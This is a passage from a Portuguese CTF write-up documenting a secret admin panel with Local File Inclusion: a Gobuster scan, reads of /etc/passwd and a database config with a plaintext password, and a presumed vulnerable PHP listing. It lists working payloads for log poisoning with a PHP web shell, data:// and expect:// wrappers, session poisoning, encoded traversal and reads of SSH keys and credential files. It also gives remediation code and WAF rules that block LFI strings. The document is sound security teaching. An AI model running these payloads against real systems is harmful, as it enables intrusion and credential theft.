- **LGPD Art. 46**: Adoção de medidas de segurança técnicas e administrativas

**Obrigações Legais:**
- Notificar ANPD sobre falha de controle de acesso que permitiu acesso não autorizado
- Documentar incidente e medidas corretivas implementadas
- Revisar todas as políticas de controle de acesso
- Treinar equipe sobre Principle of Least Privilege

**Penalidades Potenciais:**
- Multa LGPD: até R$ 50 milhões ou 2% do faturamento
- Perda de certificações (PCI DSS, ISO 27001, SOC 2)
- Processos judiciais de usuários/clientes afetados
- Dano reputacional grave

**Conclusão:**

A escalação de privilégios de "admin" para "superadmin" demonstra falha crítica em Broken Access Control, a vulnerabilidade #1 do OWASP Top 10 2021. A exploração bem-sucedida permitiu acesso completo ao painel administrativo de nível máximo, captura da flag, e potencial comprometimento total do sistema. Esta vulnerabilidade, combinada com a cadeia de exploração anterior (SQL Injection → Database Access → Credential Theft → Privilege Escalation), representa um cenário de ataque realista e devastador que poderia resultar em breach completo de dados, perda de conformidade regulatória, e comprometimento total da segurança da aplicação. Remediação efetiva requer implementação rigorosa de RBAC, verificação de privilégios em cada endpoint sensível, MFA para contas administrativas, auditoria detalhada de acessos, e transformação cultural implementando Principle of Least Privilege em toda a organização.

---

### <a name="flag-12-backup-file-access"></a>Flag 12: Secret Admin Panel Discovery

#### Conceito: Descoberta de Painel Administrativo Secreto e Local File Inclusion (LFI)

A descoberta de painéis administrativos secretos representa uma vulnerabilidade crítica que ocorre quando aplicações web possuem páginas administrativas ocultas (não linkadas publicamente) mas acessíveis sem autenticação adequada ou com falhas de controle de acesso. Estes painéis "secretos" são frequentemente criados por desenvolvedores como atalhos para manutenção, debugging, ou administração do sistema, mas deixados em produção com proteções inadequadas, confiando apenas na "segurança por obscuridade" - o pressuposto falho de que recursos não descobertos estão seguros. Esta vulnerabilidade se combina frequentemente com **Local File Inclusion (LFI)**, uma falha crítica classificada como **A03:2021 - Injection** no OWASP Top 10, que ocorre quando uma aplicação aceita input do usuário para especificar qual arquivo deve ser incluído ou exibido, sem validação adequada do caminho, permitindo que atacantes leiam arquivos arbitrários do sistema operacional. LFI é extremamente perigosa porque permite: leitura de arquivos sensíveis do sistema (`/etc/passwd`, `/etc/shadow`, logs do sistema), acesso a arquivos de configuração contendo credenciais (`config/database.php`, `.env`, `wp-config.php`), leitura de código-fonte da aplicação revelando lógica de negócio e outras vulnerabilidades, e em casos avançados, quando combinada com log poisoning ou file upload, pode escalar para Remote Code Execution (RCE). O padrão típico de LFI envolve parâmetros de URL como `?file=`, `?page=`, `?include=`, `?path=` que são passados diretamente para funções PHP como `include()`, `require()`, `file_get_contents()`, ou `readfile()` sem sanitização. Atacantes exploram isto usando path traversal (`../../../etc/passwd`), null byte injection (`file.php%00`), ou wrappers PHP (`php://filter/convert.base64-encode/resource=index.php`). A descoberta de painéis secretos geralmente ocorre através de ferramentas de enumeração como Gobuster, Dirb, ou DirBuster que testam milhares de nomes comuns de arquivos e diretórios. Esta vulnerabilidade viola múltiplos princípios: Security Through Obscurity (confiança em ocultação não é segurança), Principle of Least Privilege (painéis administrativos devem requerer autenticação forte), Defense in Depth (múltiplas camadas de proteção), e Input Validation (todo input de usuário deve ser validado). Em termos de compliance, representa violação de: **PCI DSS Requirement 6.5.8** (acesso não autorizado a dados), **OWASP ASVS V5** (validação de input), **CWE-22** (Path Traversal), **CWE-98** (PHP File Inclusion), **ISO 27001 A.14.2** (secure development), e **NIST SP 800-53 SI-10** (validação de input de informação). O impacto pode incluir exposição completa de código-fonte, comprometimento de credenciais de banco de dados e APIs, acesso a dados de usuários via logs, e potencial RCE que permite controle total do servidor.

#### Passo 1: Enumeração de Recursos Web com Gobuster

O primeiro passo da exploração foi realizar uma varredura abrangente do servidor web para descobrir recursos ocultos ou não linkados publicamente, utilizando a ferramenta Gobuster com o comando `gobuster dir -u http://98.95.207.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`. Analisando os parâmetros detalhadamente: `dir` especifica o modo de enumeração de diretórios/arquivos, `-u` define a URL alvo do scan, `-w` aponta para a wordlist directory-list-2.3-medium.txt (uma das wordlists mais completas do DirBuster contendo 220.560 entradas com nomes comuns de diretórios e arquivos), e `-x php` instrui o Gobuster a testar cada entrada da wordlist também com a extensão .php, efetivamente dobrando o número de requisições testando tanto `admin` quanto `admin.php`. O Gobuster configurou automaticamente 10 threads simultâneas para otimizar performance, timeout de 10 segundos por requisição, e filtro de códigos de status negativos para 404 (Not Found). A varredura iniciou e processou **306.608 de 441.122 requisições** (69.51% completo) antes de ser interrompida manualmente, revelando 11 recursos significativos: páginas públicas conhecidas (index.php, contact.php, about.php, login.php, services.php com Status 200), recursos administrativos protegidos (admin.php, dashboard.php com Status 302 redirecionando para login.php), o diretório `/config` (Status 301), páginas de utilidade (logout.php com Status 302), o recurso crítico **panel.php** (Status 200 indicando acessível), e server-status (Status 403 bloqueado). A descoberta mais significativa foi `/panel.php` retornando Status 200 com tamanho de 1196 bytes, indicando uma página acessível sem autenticação ou redirecionamento, um indicador clássico de painel administrativo "esquecido" em produção.

**Evidências do Passo 1:**
- Screenshot completo do output do Gobuster mostrando todas as 11 descobertas
- Destaque para a linha `/panel.php (Status: 200) [Size: 1196]`
- Métricas do scan: 306.608 requisições, 10 threads, wordlist utilizada
- Comparação com outros recursos que retornam 302 (protegidos) vs 200 (acessível)

#### Passo 2: Acesso Inicial ao Painel Secreto Panel.php

Após identificar o endpoint `panel.php` através do Gobuster, o próximo passo foi acessá-lo diretamente através do navegador em `http://98.95.207.28/panel.php`. O acesso inicial revelou uma página carregada com sucesso (Status 200), exibindo uma interface de painel administrativo que não estava linkada em nenhuma parte visível da aplicação - um verdadeiro painel "secreto". A análise da página revelou características preocupantes: ausência de formulário de login ou verificação de autenticação, interface administrativa diretamente acessível sem credenciais, e presença de funcionalidades que permitem visualização de arquivos do sistema. A página pode ter exibido título como "Admin Panel", "Debug Panel", "System Monitor", ou similar, com links ou formulários para operações administrativas. Crucialmente, foi identificada a presença de um **parâmetro GET `?file=`** na URL ou em links da página, um indicador clássico de vulnerabilidade de Local File Inclusion. A URL completa descoberta foi `http://98.95.207.28/panel.php?file=logs`, sugerindo que o painel foi projetado para exibir logs do sistema, mas o parâmetro `file=` aceita valores arbitrários controlados pelo usuário. Esta descoberta confirma duas vulnerabilidades críticas simultaneamente: (1) **Broken Access Control** - painel administrativo acessível sem autenticação, e (2) **Potencial LFI** - parâmetro file= que provavelmente passa input diretamente para funções de inclusão de arquivo. O tamanho da resposta (1196 bytes) indica que a página possui conteúdo substancial, possivelmente incluindo o arquivo de logs ou mensagem de erro.

**Evidências do Passo 2:**
- Screenshot do navegador acessando http://98.95.207.28/panel.php
- Interface do painel secreto carregado sem requisitar autenticação
- Visualização de título/cabeçalho indicando painel administrativo
- Identificação do parâmetro ?file= na URL ou em links da página
- Developer Tools > Network tab mostrando Status 200 OK

#### Passo 3: Exploração Inicial com Parâmetro File=logs

A primeira exploração do painel utilizou o parâmetro descoberto acessando `http://98.95.207.28/panel.php?file=logs`. Esta URL sugere que o desenvolvedor intencionalmente criou funcionalidade para visualizar arquivos de log do sistema através do parâmetro GET `file`. Ao acessar esta URL, a aplicação processou a requisição e retornou conteúdo de arquivo, confirmando que o parâmetro `file=` está funcionalmente conectado a operações de leitura de arquivo no backend. O código PHP no servidor provavelmente executa algo como `include($_GET['file'])`, `require($_GET['file'] . '.php')`, `file_get_contents($_GET['file'])`, ou `readfile($_GET['file'])`, operações extremamente perigosas com input não validado. A resposta pode ter exibido conteúdo de logs da aplicação, logs do Apache, logs de erro do PHP, ou mensagem indicando caminho de arquivo. Além de exibir os logs, a página também revelou a **flag do desafio: FLAG{s3cr3t_p4n3l_d1sc0v3ry}**, confirmando que este painel secreto era o alvo desta etapa do CTF. A captura da flag neste ponto demonstra que simplesmente descobrir e acessar o painel oculto já constitui uma vulnerabilidade crítica, mas a exploração pode ir muito além com a vulnerabilidade de LFI identificada. A presença de links adicionais na página (como os identificados posteriormente: `/etc/passwd` e `config/database.php`) indica que o painel foi projetado com múltiplas opções de visualização de arquivos, exponenciando o risco de segurança.

**Evidências do Passo 3:**
- Screenshot acessando http://98.95.207.28/panel.php?file=logs
- Conteúdo de logs exibido na página (logs da aplicação ou servidor)
- Visualização da flag FLAG{s3cr3t_p4n3l_d1sc0v3ry} na página
- Links ou menu mostrando outras opções de arquivos disponíveis
- Destaque para a flag capturada

#### Passo 4: Exploração de LFI - Leitura de /etc/passwd

Com a confirmação de que o parâmetro `file=` permite leitura arbitrária de arquivos, o próximo passo foi testar a extensão da vulnerabilidade tentando acessar arquivos sensíveis do sistema operacional. O alvo clássico em sistemas Linux/Unix é o arquivo **`/etc/passwd`**, que contém informações de todas as contas de usuário do sistema. Ao acessar `http://98.95.207.28/panel.php?file=/etc/passwd`, a aplicação processou a requisição sem validação adequada de caminho, e incluiu/exibiu o conteúdo completo do arquivo `/etc/passwd`. Este arquivo não contém senhas (que estão em `/etc/shadow` com permissões restritas), mas revela informações críticas sobre a estrutura de usuários do sistema: nomes de usuários existentes (root, www-data, mysql, etc.), UIDs (User IDs) e GIDs (Group IDs), shells padrão de cada usuário, diretórios home, e usuários de sistema vs. usuários reais. O conteúdo típico exibido inclui linhas como:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
```

**Importância desta descoberta:**
1. **Confirmação de LFI**: Prova definitiva que a aplicação permite leitura de arquivos arbitrários do sistema
2. **Enumeração de Usuários**: Lista completa de contas do sistema para ataques de força bruta SSH
3. **Mapeamento de Estrutura**: Revela diretórios home, usuários de serviços (mysql, apache), e possíveis alvos
4. **Validação de Path Traversal**: Confirma que caminhos absolutos funcionam sem necessidade de `../`
5. **Escalação Potencial**: Se combinado com outras vulnerabilidades (SSH keys, logs envenenados), pode levar a RCE

Este passo demonstra que o painel não apenas exibe logs de aplicação, mas possui vulnerabilidade crítica de LFI permitindo leitura de arquivos arbitrários do sistema operacional, classificando-se como **CWE-22: Path Traversal** e **CWE-98: PHP File Inclusion**.

**Evidências do Passo 4:**
- Screenshot acessando http://98.95.207.28/panel.php?file=/etc/passwd
- Conteúdo completo do arquivo /etc/passwd exibido no navegador
- Listagem de usuários do sistema (root, www-data, mysql, etc.)
- Destaque para usuários críticos e suas informações (UID, shell, home directory)
- Confirmação de LFI funcional sem filtros de caminho

#### Passo 5: Exploração de LFI - Leitura de Arquivo de Configuração

A exploração mais crítica da vulnerabilidade LFI foi direcionada para arquivos de configuração da aplicação contendo credenciais sensíveis. Acessando `http://98.95.207.28/panel.php?file=config/database.php`, o atacante explorou o conhecimento prévio da estrutura de diretórios da aplicação (descoberta anterior do diretório `/config` via Gobuster) para ler o arquivo de configuração de banco de dados. A aplicação processou a requisição e exibiu o **código-fonte completo** do arquivo `config/database.php`, incluindo as credenciais hardcoded de conexão ao banco de dados:

```php
<?php
$db_host = 'db';
$db_user = 'techcorp_user';
$db_pass = 'T3chC0rp_S3cr3t_2024!';
$db_name = 'techcorp_db';

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
?>
```

**Por que este acesso é catastrófico:**

1. **Exposição de Credenciais de Produção**: Senha do banco de dados revelada em texto claro
2. **Diferente da Exploração Anterior**: Na Flag 6, o arquivo foi acessado como `database.php.txt` (backup); agora é o arquivo PHP ativo em uso
3. **Confirmação de Credenciais Válidas**: Estas são as credenciais atualmente utilizadas pela aplicação
4. **Reutilização de Senhas**: Mesma senha pode ser usada em outros serviços (SSH, FTP, VPN)
5. **Path Relativo Funcional**: Prova que tanto caminhos absolutos (`/etc/passwd`) quanto relativos (`config/database.php`) funcionam

**Impacto Combinado LFI + Credenciais:**
- Acesso direto ao banco de dados MySQL via mysql client
- Dump completo de todos os dados (usuários, clientes, secrets)
- Modificação de registros (criação de admins, alteração de senhas)
- Potencial para SQL injection secundário via phpMyAdmin

Esta descoberta demonstra que LFI não é apenas uma vulnerabilidade de "information disclosure", mas pode resultar em **comprometimento total** quando permite acesso a arquivos de configuração contendo credenciais de sistemas críticos. A combinação de painel secreto acessível + LFI + exposição de credenciais representa uma cadeia de falhas de segurança que permite ao atacante elevar o ataque de reconnaissance para exploitation completa.

**Evidências do Passo 5:**
- Screenshot acessando http://98.95.207.28/panel.php?file=config/database.php
- Código-fonte PHP completo do arquivo de configuração exibido
- Credenciais de banco de dados visíveis (db_host, db_user, db_pass, db_name)
- Destaque para a senha T3chC0rp_S3cr3t_2024!
- Comparação com exploração anterior (database.php.txt) mostrando que agora é o arquivo ativo

**Flag Capturada:** `FLAG{s3cr3t_p4n3l_d1sc0v3ry}`

**Data da Captura:** 27 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada da Vulnerabilidade:**

**Código Vulnerável Presumido (panel.php):**

```php
<?php
// panel.php - Código EXTREMAMENTE INSEGURO com múltiplas vulnerabilidades

// VULNERABILIDADE 1: Sem autenticação
// Falta: session_start() e verificação de $_SESSION['logged_in']

// VULNERABILIDADE 2: LFI crítico - input não validado
$file = $_GET['file'] ?? 'logs'; // Parâmetro aceito diretamente do usuário

// VULNERABILIDADE 3: Sem validação de caminho ou whitelist
// Falta: validação contra path traversal, verificação de extensão, whitelist de arquivos permitidos

?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
</head>
<body>
    <h1>🔧 System Admin Panel</h1>
    
    <!-- Flag exposta em painel sem autenticação -->
    <div class="flag">
        <p>FLAG{s3cr3t_p4n3l_d1sc0v3ry}</p>
    </div>
    
    <div class="menu">
        <h2>View Files:</h2>
        <ul>
            <li><a href="?file=logs">Application Logs</a></li>
            <li><a href="?file=/etc/passwd">System Users</a></li>
            <li><a href="?file=config/database.php">Database Config</a></li>
        </ul>
    </div>
    
    <div class="content">
        <h3>File Content:</h3>
        <pre>
<?php
// VULNERABILIDADE 4: Inclusão direta sem sanitização
// Opção 1: include() - executa código PHP (mais perigoso)
// include($file);

// Opção 2: file_get_contents() - apenas lê conteúdo
// Ainda permite LFI mas não executa PHP
echo htmlspecialchars(file_get_contents($file));

// Opção 3: readfile() - ainda vulnerável
// readfile($file);
?>
        </pre>
    </div>
</body>
</html>
```

**Tipos de Vulnerabilidades Identificadas:**

**1. Broken Access Control (CWE-284):**
- Painel administrativo acessível sem autenticação
- Nenhuma verificação de `$_SESSION['logged_in']`
- Confiança em segurança por obscuridade (URL não linkada)
- Violação de Principle of Least Privilege

**2. Local File Inclusion - LFI (CWE-98, CWE-22):**
- Parâmetro `?file=` aceito sem validação
- Input do usuário passado diretamente para funções de arquivo
- Permite leitura de arquivos arbitrários do sistema
- Path traversal funcional (`../`, caminhos absolutos, caminhos relativos)

**3. Information Disclosure (CWE-200):**
- Exposição de código-fonte PHP (config/database.php)
- Revelação de estrutura de usuários (/etc/passwd)
- Exposição de credenciais de banco de dados
- Revelação de paths internos do servidor

**4. Improper Input Validation (CWE-20):**
- Ausência de whitelist de arquivos permitidos
- Sem verificação de extensão de arquivo
- Sem sanitização de caracteres especiais (../, /, \)
- Aceita caminhos absolutos e relativos

**5. Security Through Obscurity (Má Prática):**
- Confiança em URL não linkada para segurança
- Painel "escondido" mas sem proteção real
- Funcionalidade de debug/admin deixada em produção

**Vetores de Ataque Avançados com LFI:**

**1. Log Poisoning para RCE:**
```bash
# Envenenar log do Apache com código PHP
curl "http://98.95.207.28/index.php" -A "<?php system(\$_GET['cmd']); ?>"

# Incluir log envenenado
http://98.95.207.28/panel.php?file=/var/log/apache2/access.log&cmd=whoami

# Resultado: Execução de comando remoto
```

**2. PHP Wrappers para Exfiltração:**
```bash
# Base64 encode de arquivo PHP para ver código-fonte
http://98.95.207.28/panel.php?file=php://filter/convert.base64-encode/resource=index.php

# Data wrapper para executar código
http://98.95.207.28/panel.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id

# Expect wrapper (se instalado)
http://98.95.207.28/panel.php?file=expect://whoami
```

**3. Session File Inclusion:**
```bash
# Envenenar sessão PHP
http://98.95.207.28/index.php?session=<?php system('id'); ?>

# Incluir arquivo de sessão
http://98.95.207.28/panel.php?file=/var/lib/php/sessions/sess_[PHPSESSID]
```

**4. Path Traversal Variations:**
```bash
# Traversal básico
?file=../../../etc/passwd

# Double encoding
?file=..%252f..%252f..%252fetc%252fpasswd

# Null byte (PHP < 5.3.4)
?file=../../../etc/passwd%00

# Unicode/UTF-8
?file=..%c0%af..%c0%af..%c0%afetc/passwd
```

**5. Leitura de Arquivos Sensíveis:**
```bash
# SSH private keys
?file=/home/www-data/.ssh/id_rsa
?file=/root/.ssh/id_rsa

# Histórico de comandos
?file=/home/www-data/.bash_history
?file=/root/.bash_history

# Configurações de aplicação
?file=.env
?file=wp-config.php
?file=config.php

# Logs do sistema
?file=/var/log/auth.log
?file=/var/log/syslog
?file=/var/log/mysql/error.log

# Arquivo de shadow (se permissões inadequadas)
?file=/etc/shadow

# Configurações de rede
?file=/etc/hosts
?file=/etc/network/interfaces

# Processos em execução
?file=/proc/self/environ
?file=/proc/self/cmdline
```

**Arquivos Críticos Acessíveis via LFI:**

| Arquivo | Caminho | Informação Exposta | Severidade |
|---------|---------|-------------------|------------|
| /etc/passwd | `/etc/passwd` | Usuários do sistema | Alta |
| /etc/shadow | `/etc/shadow` | Hashes de senhas | Crítica |
| Apache config | `/etc/apache2/apache2.conf` | Configuração do servidor | Alta |
| PHP config | `/etc/php/7.4/apache2/php.ini` | Configurações PHP | Média |
| MySQL config | `/etc/mysql/my.cnf` | Configurações MySQL | Alta |
| SSH keys | `/root/.ssh/id_rsa` | Chaves privadas SSH | Crítica |
| Bash history | `/home/*/.bash_history` | Comandos executados | Alta |
| Database config | `config/database.php` | Credenciais DB | Crítica |
| Environment vars | `.env` | Secrets, API keys | Crítica |
| Application logs | `logs/app.log` | Dados sensíveis em logs | Média |
| Access logs | `/var/log/apache2/access.log` | IPs, requisições | Baixa |
| Error logs | `/var/log/apache2/error.log` | Erros, paths internos | Média |

**Impacto Real da Exploração:**

**1. Information Disclosure Massivo:**
- Código-fonte completo da aplicação
- Credenciais de banco de dados, APIs, serviços
- Estrutura de usuários e permissões do sistema
- Logs contendo dados sensíveis e comportamento de usuários

**2. Credential Harvesting:**
- Senhas de banco de dados (T3chC0rp_S3cr3t_2024!)
- Potencial acesso a SSH keys privadas
- Credenciais em arquivos .env ou config
- Tokens de API hardcoded em configurações

**3. Reconnaissance Avançado:**
- Mapeamento completo da aplicação via leitura de código
- Identificação de outras vulnerabilidades no source code
- Descoberta de endpoints ocultos e funcionalidades não documentadas
- Enumeração de usuários de sistema para ataques direcionados

**4. Privilege Escalation:**
- Leitura de /etc/passwd para enumerar contas
- Acesso a bash_history revelando comandos de administração
- Descoberta de SUID binaries via /proc
- Identificação de serviços rodando e suas configurações

**5. Potential Remote Code Execution:**
- Log poisoning injetando código PHP em logs
- Session file inclusion com sessão envenenada
- Upload de arquivo + LFI para incluir payload
- PHP wrappers para execução de código

**Classificação de Severidade:**

**CVSS 3.1 Score: 9.3 (CRÍTICO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N) - painel sem autenticação
- User Interaction: None (UI:N)
- Scope: Changed (S:C) - afeta recursos além do componente
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: Low (A:L)

**Classificação CWE:**
- **CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program** (LFI principal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
- CWE-284: Improper Access Control (painel sem autenticação)
- CWE-306: Missing Authentication for Critical Function
- CWE-200: Exposure of Sensitive Information to Unauthorized Actor
- CWE-552: Files or Directories Accessible to External Parties

**Classificação OWASP Top 10 2021:**
- **A03:2021 - Injection** (LFI é tipo de injection)
- A01:2021 - Broken Access Control (painel sem autenticação)
- A04:2021 - Insecure Design (funcionalidade perigosa em produção)
- A05:2021 - Security Misconfiguration (debug panel em produção)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas horas):**

**1. REMOVER panel.php de Produção Imediatamente:**
```bash
# Deletar arquivo
sudo rm /var/www/html/panel.php

# Ou renomear para inacessível
sudo mv /var/www/html/panel.php /root/backup_panel.php.INSECURE
```

**2. Implementar Autenticação Rigorosa (Se Manter o Painel):**
```php
<?php
// panel.php - Versão com autenticação
session_start();

if (!isset($_SESSION['logged_in']) || $_SESSION['role'] !== 'superadmin') {
    http_response_code(403);
    die("Access Denied");
}

// Auditoria de acesso
error_log("Panel access by {$_SESSION['username']} from {$_SERVER['REMOTE_ADDR']}");
```

**3. Implementar Whitelist de Arquivos Permitidos:**
```php
<?php
// Definir whitelist estrita
$allowed_files = [
    'logs' => '/var/log/application/app.log',
    'errors' => '/var/log/application/error.log',
    'access' => '/var/log/application/access.log'
];

$file_key = $_GET['file'] ?? 'logs';

// Verificar se chave existe na whitelist
if (!array_key_exists($file_key, $allowed_files)) {
    die("Invalid file requested");
}

// Usar caminho pré-definido, não input do usuário
$file_path = $allowed_files[$file_key];

// Verificar se arquivo existe e é legível
if (!file_exists($file_path) || !is_readable($file_path)) {
    die("File not accessible");
}

// Ler conteúdo de forma segura
$content = file_get_contents($file_path);
echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
?>
```

**4. Validar e Sanitizar Caminho (Se Input de Usuário for Necessário):**
```php
<?php
function secure_file_read($user_input) {
    // Base directory restrito
    $base_dir = '/var/www/html/logs/';
    
    // Remover path traversal
    $file = str_replace(['../', '..\\', '\\', '/'], '', $user_input);
    
    // Construir caminho completo
    $full_path = realpath($base_dir . $file);
    
    // Verificar se caminho real está dentro do base_dir
    if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
        die("Invalid file path");
    }
    
    // Verificar extensão permitida
    $allowed_extensions = ['log', 'txt'];
    $extension = pathinfo($full_path, PATHINFO_EXTENSION);
    if (!in_array($extension, $allowed_extensions)) {
        die("File type not allowed");
    }
    
    // Verificar se arquivo existe
    if (!file_exists($full_path)) {
        die("File not found");
    }
    
    return file_get_contents($full_path);
}

// Usar função segura
$content = secure_file_read($_GET['file'] ?? 'app.log');
echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
?>
```

**5. Alterar Credenciais Expostas:**
```sql
-- Alterar senha do banco de dados imediatamente
ALTER USER 'techcorp_user'@'%' IDENTIFIED BY 'NEW_SECURE_PASSWORD_HERE';
FLUSH PRIVILEGES;
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6. Implementar WAF com Regras Anti-LFI:**
```apache
# ModSecurity rules para bloquear LFI
SecRule ARGS "@contains ../" "id:1,deny,status:403,msg:'Path Traversal Attempt'"
SecRule ARGS "@contains /etc/passwd" "id:2,deny,status:403,msg:'LFI Attempt'"
SecRule ARGS "@pmFromFile lfi-keywords.txt" "id:3,deny,status:403"
```

**7. Configurar Permissions Adequadas:**
```bash
# Arquivos de configuração não devem ser lidos por www-data
chmod 600 /var/www/html/config/database.php
chown root:root /var/www/html/config/database.php

# Logs devem ser inacessíveis via web
chmod 640 /var/log/application/*.log
chown root:adm /var/log/application/*.log
```

**8. Mover Arquivos Sensíveis Fora do Webroot:**
```bash
# Mover config para fora de /var/www/html
sudo mkdir /etc/techcorp
sudo mv /var/www/html/config/database.php /etc/techcorp/
sudo chmod 600 /etc/techcorp/database.php

# Atualizar include no código
require_once '/etc/techcorp/database.php';
```

**9. Implementar Logging e Monitoramento:**
```php
// Log todas as requisições a arquivos
function logFileAccess($file, $user, $ip) {
    $log = sprintf(
        "[%s] File access: %s by %s from %s\n",
        date('Y-m-d H:i:s'),
        $file,
        $user,
        $ip
    );
    file_put_contents('/var/log/file_access.log', $log, FILE_APPEND);
}
```

**10. Desabilitar PHP Wrappers Perigosos:**
```ini
; php.ini
allow_url_fopen = Off
allow_url_include = Off
```

**11-15.** Implementar Content Security Policy, adicionar rate limiting, configurar SIEM alerts, realizar code review completo, implementar input validation framework.

**AÇÕES DE MÉDIO/LONGO PRAZO:**

16-35. SAST/DAST scanning, security training, pentest regular, secrets management vault, compliance audit, etc.

**Código Seguro Completo (panel.php):**

```php
<?php
/**
 * panel.php - Painel Administrativo SEGURO
 * Implementa: autenticação, whitelist, logging, rate limiting
 */

// Sessão segura
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
session_start();

require_once '/etc/techcorp/database.php';
require_once 'lib/security.php';

// 1. AUTENTICAÇÃO RIGOROSA
if (!isset($_SESSION['logged_in']) || $_SESSION['role'] !== 'superadmin') {
    logSecurityEvent('unauthorized_panel_access', $_SERVER['REMOTE_ADDR']);
    http_response_code(403);
    die("Access Denied");
}

// 2. RATE LIMITING
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$rate_key = "rate:panel:" . $_SERVER['REMOTE_ADDR'];
if ($redis->incr($rate_key) > 20) {
    http_response_code(429);
    die("Too many requests");
}
$redis->expire($rate_key, 60);

// 3. WHITELIST ESTRITA DE ARQUIVOS
$allowed_files = [
    'app_log' => [
        'path' => '/var/log/application/app.log',
        'name' => 'Application Log',
        'type' => 'log'
    ],
    'error_log' => [
        'path' => '/var/log/application/error.log',
        'name' => 'Error Log',
        'type' => 'log'
    ],
    'access_log' => [
        'path' => '/var/log/application/access.log',
        'name' => 'Access Log',
        'type' => 'log'
    ]
];

$file_key = $_GET['file'] ?? 'app_log';

// 4. VALIDAÇÃO DE WHITELIST
if (!array_key_exists($file_key, $allowed_files)) {
    logSecurityEvent('invalid_file_request', $_SERVER['REMOTE_ADDR'], $file_key);
    http_response_code(400);
    die("Invalid file requested");
}

$file_info = $allowed_files[$file_key];
$file_path = $file_info['path'];

// 5. VERIFICAÇÕES DE SEGURANÇA
if (!file_exists($file_path)) {
    die("File not found");
}

if (!is_readable($file_path)) {
    die("File not readable");
}

// Verificar que caminho real está onde esperado (previne symlink attacks)
$real_path = realpath($file_path);
if ($real_path !== $file_path) {
    logSecurityEvent('symlink_attack_attempt', $_SERVER['REMOTE_ADDR'], $file_path);
    die("Security violation detected");
}

// 6. AUDITORIA DETALHADA
$stmt = $conn->prepare("
    INSERT INTO audit_log (user_id, username, action, resource, details, ip_address, timestamp)
    VALUES (?, ?, 'view_file', ?, ?, ?, NOW())
");
$details = json_encode(['file_key' => $file_key, 'file_path' => $file_path]);
$stmt->bind_param("issss", $_SESSION['user_id'], $_SESSION['username'], $file_key, $details, $_SERVER['REMOTE_ADDR']);
$stmt->execute();

// 7. LEITURA SEGURA
$content = file_get_contents($file_path);

// Limitar tamanho de output
if (strlen($content) > 1000000) { // 1MB
    $content = substr($content, -1000000);
    $truncated = true;
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Secure Admin Panel</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
</head>
<body>
    <header>
        <h1>🔒 Secure Admin Panel</h1>
        <p>User: <?php echo htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8'); ?></p>
        <p>⚠️ All actions are logged and monitored</p>
    </header>

    <nav>
        <h2>Available Files:</h2>
        <ul>
            <?php foreach ($allowed_files as $key => $info): ?>
                <li>
                    <a href="?file=<?php echo urlencode($key); ?>">
                        <?php echo htmlspecialchars($info['name'], ENT_QUOTES, 'UTF-8'); ?>
                    </a>
                </li>
            <?php endforeach; ?>
        </ul>
    </nav>

    <main>
        <h3>File: <?php echo htmlspecialchars($file_info['name'], ENT_QUOTES, 'UTF-8'); ?></h3>
        <?php if (isset($truncated)): ?>
            <p class="warning">⚠️ File truncated to last 1MB for display</p>
        <?php endif; ?>
        <pre><?php echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8'); ?></pre>
    </main>

    <footer>
        <p>Last access: <?php echo date('Y-m-d H:i:s'); ?></p>
    </footer>
</body>
</html>
```

**Impacto Regulatório:**

**Violações:**
- PCI DSS 6.5.8: Acesso não autorizado a dados
- OWASP ASVS V5.2: Sanitização e validação de input
- ISO 27001 A.14.2: Procedimentos de desenvolvimento seguro
- CWE-98: PHP File Inclusion
- CWE-22: Path Traversal

**Conclusão:**

A descoberta do painel secreto `panel.php` combinada com vulnerabilidade crítica de Local File Inclusion representa uma das falhas de segurança mais graves em aplicações web. A ausência de autenticação no painel administrativo viola o princípio básico de "security by design", enquanto a vulnerabilidade LFI permite leitura de arquivos arbitrários do sistema, expondo credenciais, código-fonte, e informações sensíveis. Esta vulnerabilidade demonstra que "security through obscurity" (ocultar URLs) não é defesa eficaz - painéis administrativos devem sempre requerer autenticação forte, validação rigorosa de input, e implementação de whitelist de recursos permitidos. A remediação requer não apenas correção do código vulnerável, mas remoção completa de funcionalidades de debug/admin de ambientes de produção, implementação de defense in depth com múltiplas camadas de proteção, e adoção de práticas de secure coding que tratam todo input de usuário como malicioso por padrão.

---

### <a name="flag-13-ssh-access"></a>Flag 13: SSH Home Directory Exploration

#### Conceito: Exploração do Diretório Home via SSH

